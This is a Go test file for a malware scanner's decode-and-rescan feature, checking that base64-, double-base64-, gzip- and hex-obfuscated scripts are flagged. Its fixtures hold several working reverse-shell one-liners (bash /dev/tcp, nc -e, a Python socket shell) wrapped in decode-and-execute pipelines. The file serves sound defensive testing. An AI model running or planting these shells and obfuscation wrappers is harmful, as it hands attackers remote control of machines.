package scanner_test

import (
	"bytes"
	"compress/gzip"
	"context"
	"encoding/base64"
	"fmt"
	"testing"

	"aether/internal/config"
	"aether/internal/report"
	"aether/internal/scanner"
)

func gzipCompress(data []byte) []byte {
	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	_, _ = w.Write(data)
	_ = w.Close()
	return buf.Bytes()
}

func TestDecodeAndRescan_Base64(t *testing.T) {
	cfg := config.NewDefaultConfig()
	ctx := context.Background()

	// 1. Base64 encoded reverse shell
	rawShell := "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
	b64Encoded := base64.StdEncoding.EncodeToString([]byte(rawShell))
	scriptContent := []byte(fmt.Sprintf("#!/bin/bash\necho %s | base64 -d | bash\n", b64Encoded))

	match, layers := scanner.DecodeAndRescan(ctx, "/tmp/rev.sh", scriptContent, nil, cfg, nil)
	if match == nil {
		t.Fatalf("expected Script_Obfuscated_Payload match for base64 encoded reverse shell")
	}
	if match.Name != "Script_Obfuscated_Payload" {
		t.Errorf("expected rule Script_Obfuscated_Payload, got %s", match.Name)
	}
	if match.Severity != report.SeverityAlert {
		t.Errorf("expected Alert severity, got %s", match.Severity)
	}
	if len(layers) == 0 || layers[0] != "base64" {
		t.Errorf("expected layers to start with base64, got %v", layers)
	}
}

func TestDecodeAndRescan_DoubleBase64(t *testing.T) {
	cfg := config.NewDefaultConfig()
	ctx := context.Background()

	rawShell := "nc -e /bin/sh 192.168.1.100 9001"
	layer1 := base64.StdEncoding.EncodeToString([]byte(rawShell))
	layer2 := base64.StdEncoding.EncodeToString([]byte(layer1))
	scriptContent := []byte(fmt.Sprintf("#!/bin/bash\nDATA=\"%s\"\necho $DATA | base64 -d | base64 -d | sh\n", layer2))

	match, layers := scanner.DecodeAndRescan(ctx, "/var/tmp/staged.sh", scriptContent, nil, cfg, nil)
	if match == nil {
		t.Fatalf("expected match for double-base64 encoded payload")
	}
	if len(layers) < 2 {
		t.Fatalf("expected at least 2 layers of de-obfuscation, got %v", layers)
	}
	if layers[0] != "base64" || layers[1] != "base64" {
		t.Errorf("expected layers [base64, base64], got %v", layers)
	}
}

func TestDecodeAndRescan_GzipBase64(t *testing.T) {
	cfg := config.NewDefaultConfig()
	ctx := context.Background()

	rawShell := "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
	compressed := gzipCompress([]byte(rawShell))
	b64Encoded := base64.StdEncoding.EncodeToString(compressed)
	scriptContent := []byte(fmt.Sprintf("#!/bin/sh\necho '%s' | base64 -d | gunzip | sh\n", b64Encoded))

	match, layers := scanner.DecodeAndRescan(ctx, "/tmp/compressed_payload.sh", scriptContent, nil, cfg, nil)
	if match == nil {
		t.Fatalf("expected match for base64+gzip compressed payload")
	}
	if len(layers) < 2 {
		t.Fatalf("expected at least 2 decode layers, got %v", layers)
	}
	// Layers order: outer base64, then inner gzip
	if layers[0] != "base64" || layers[1] != "gzip" {
		t.Errorf("expected layers [base64, gzip], got %v", layers)
	}
}

func TestDecodeAndRescan_HexEscape(t *testing.T) {
	cfg := config.NewDefaultConfig()
	ctx := context.Background()

	rawShell := "/bin/bash -i >& /dev/tcp/1.2.3.4/8080 0>&1"
	var hexEscaped string
	for _, b := range []byte(rawShell) {
		hexEscaped += fmt.Sprintf("\\x%02x", b)
	}
	scriptContent := []byte(fmt.Sprintf("#!/bin/sh\nprintf '%s' | sh\n", hexEscaped))

	match, layers := scanner.DecodeAndRescan(ctx, "/tmp/hex_shell.sh", scriptContent, nil, cfg, nil)
	if match == nil {
		t.Fatalf("expected match for hex-escaped reverse shell")
	}
	if len(layers) == 0 || layers[0] != "hex" {
		t.Errorf("expected layers to start with hex, got %v", layers)
	}
}

func TestDecodeAndRescan_BenignBase64(t *testing.T) {
	cfg := config.NewDefaultConfig()
	ctx := context.Background()

	// Benign base64 string (e.g. a logo or license string)
	benignText := "This is a completely normal documentation string explaining how to build software packages on Debian GNU/Linux."
	b64Encoded := base64.StdEncoding.EncodeToString([]byte(benignText))
	scriptContent := []byte(fmt.Sprintf("# Benign README\n# Base64 hash: %s\n", b64Encoded))

	match, layers := scanner.DecodeAndRescan(ctx, "/usr/share/doc/package/README", scriptContent, nil, cfg, nil)
	if match != nil {
		t.Fatalf("expected nil for benign base64 text, got match %v with layers %v", match, layers)
	}
}

func TestDecodeAndRescan_ContextCancellation(t *testing.T) {
	cfg := config.NewDefaultConfig()
	ctx, cancel := context.WithCancel(context.Background())
	cancel() // Cancel immediately

	rawShell := "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
	b64Encoded := base64.StdEncoding.EncodeToString([]byte(rawShell))

	match, layers := scanner.DecodeAndRescan(ctx, "/tmp/test.sh", []byte(b64Encoded), nil, cfg, nil)
	if match != nil || layers != nil {
		t.Fatalf("expected nil when context is canceled, got %v", match)
	}
}
